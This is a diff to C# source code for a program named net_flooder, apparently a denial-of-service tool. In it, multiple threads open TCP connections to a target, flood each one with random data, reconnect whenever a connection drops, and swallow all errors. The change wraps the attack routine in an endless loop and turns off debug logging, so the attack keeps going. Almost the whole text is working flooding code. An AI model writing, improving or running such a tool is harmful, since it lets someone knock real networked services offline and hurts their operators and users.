@@ -33,7 +33,6 @@ namespace net_flooder {
 			try {
 				for ( int i = 0; i < THREAD_COUNT; i++ )
 					new Thread( new ParameterizedThreadStart( WAttack ) ).Start( trg );
-				//Attack(trg);
 			}
 			catch ( Exception ex ) {
 				_e( ex.Message );
@@ -49,90 +48,95 @@ namespace net_flooder {
 		/// </summary>
 		/// <param name="trg"></param>
 		private static void Attack( IPEndPoint trg ) {
-			#region Constructors
-			Socket s = new Socket( AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp );
-			Random r = new Random();
-			SocketAsyncEventArgs Snd, Conn;
-			var t = new System.Timers.Timer( TIMEOUT );//new TimerCallback(( a ) => { try { s.Close(); } catch { } })
-			byte[] bytes = new byte[ BUFFER_SIZE ];
-			EventHandler<SocketAsyncEventArgs> CONNECTED = null, SND = null;
-			#endregion
-			Conn = new SocketAsyncEventArgs() {
-				DisconnectReuseSocket = true,
-				RemoteEndPoint = trg,
-				SocketFlags = SocketFlags.None,
-				UserToken = s
-			};
-			Snd = new SocketAsyncEventArgs() {
-				DisconnectReuseSocket = true,
-				SocketFlags = SocketFlags.None,
-				UserToken = s
-			};
-			SND = ( a, b ) => {
+			while ( true ) {
 				try {
-					bool running = true;
-					_d( String.Format( "Sent {0}K data!", BUFFER_SIZE ) );
-					while ( running ) {
-						while ( b.SocketError == SocketError.Success && ( (Socket)a ).Connected ) {
-							try {
-								if ( ( (Socket)a ).SendAsync( Snd ) )
-									return; //prevent stack overflow
-								_d( String.Format( "Sent {0}K data!", BUFFER_SIZE ) );
-							}
-							catch {
-							}
-						}
-						int cnt = 0;
-						running = false;
-						if ( !running ) {
-							Snd.UserToken = Conn.UserToken = a = s = new Socket( AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp );
-							try {
-								if ( ( (Socket)a ).ConnectAsync( Conn ) )
-									return;
-							}
-							catch {
-							}
-							running = true;
-							_d( "Connected!" );
-						}
-					}
-				}
-				catch {
-				}
-			};
-			CONNECTED = ( a, b ) => {
-				try {
-					_d( "Connected!" );
-					while ( b.SocketError != SocketError.Success || !( (Socket)a ).Connected )
+					#region Constructors
+					Socket s = new Socket( AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp );
+					Random r = new Random();
+					SocketAsyncEventArgs Snd, Conn;
+					var t = new System.Timers.Timer( TIMEOUT );//new TimerCallback(( a ) => { try { s.Close(); } catch { } })
+					byte[] bytes = new byte[ BUFFER_SIZE ];
+					EventHandler<SocketAsyncEventArgs> CONNECTED = null, SND = null;
+					#endregion
+					Conn = new SocketAsyncEventArgs() {
+						DisconnectReuseSocket = true,
+						RemoteEndPoint = trg,
+						SocketFlags = SocketFlags.None,
+						UserToken = s
+					};
+					Snd = new SocketAsyncEventArgs() {
+						DisconnectReuseSocket = true,
+						SocketFlags = SocketFlags.None,
+						UserToken = s
+					};
+					SND = ( a, b ) => {
 						try {
-							if ( ( (Socket)a ).ConnectAsync( Conn ) ) {
-								_d( "Connected!" );
-								return;//prevent stack overflow
+							bool running = true;
+							_d( String.Format( "Sent {0}K data!", BUFFER_SIZE ) );
+							while ( running ) {
+								while ( b.SocketError == SocketError.Success && ( (Socket)a ).Connected ) {
+									try {
+										if ( ( (Socket)a ).SendAsync( Snd ) )
+											return; //prevent stack overflow
+										_d( String.Format( "Sent {0}K data!", BUFFER_SIZE ) );
+									}
+									catch {
+									}
+								}
+								int cnt = 0;
+								running = false;
+								if ( !running ) {
+									Snd.UserToken = Conn.UserToken = a = s = new Socket( AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp );
+									try {
+										if ( ( (Socket)a ).ConnectAsync( Conn ) )
+											return;
+									}
+									catch {
+									}
+									running = true;
+									_d( "Connected!" );
+								}
 							}
 						}
 						catch {
 						}
-					try {
-						if ( !( (Socket)a ).SendAsync( Snd ) )
-							SND( a, Snd );
-					}
-					catch {
-					}
+					};
+					CONNECTED = ( a, b ) => {
+						try {
+							_d( "Connected!" );
+							while ( b.SocketError != SocketError.Success || !( (Socket)a ).Connected )
+								try {
+									if ( ( (Socket)a ).ConnectAsync( Conn ) ) {
+										_d( "Connected!" );
+										return;//prevent stack overflow
+									}
+								}
+								catch {
+								}
+							try {
+								if ( !( (Socket)a ).SendAsync( Snd ) )
+									SND( a, Snd );
+							}
+							catch {
+							}
+						}
+						catch {
+						}
+					};
+
+					Snd.Completed += SND;
+					Conn.Completed += CONNECTED;
+					r.NextBytes( bytes );
+					Snd.SetBuffer( bytes, 0, bytes.Length );
+					s.Blocking = false;
+					_d( "real_attack_starting" );
+					if ( !s.ConnectAsync( Conn ) )
+						CONNECTED( s, Conn );
+					Thread.Sleep( Timeout.Infinite );
 				}
 				catch {
 				}
-			};
-
-			Snd.Completed += SND;
-			Conn.Completed += CONNECTED;
-			r.NextBytes( bytes );
-			Snd.SetBuffer( bytes, 0, bytes.Length );
-			s.Blocking = false;
-			_d( "real_attack_starting" );
-			if ( !s.ConnectAsync( Conn ) ) {
-				CONNECTED( s, Conn );
 			}
-			Thread.Sleep( Timeout.Infinite );
 		}
 		static void _e( string e ) {
 			var con_c = Console.ForegroundColor;
@@ -168,7 +172,7 @@ namespace net_flooder {
 			return s;
 		}
 		static void _d( string d ) {
-			Debug.WriteLine( d );
+			//Debug.WriteLine( d );
 		}
 	}
 }
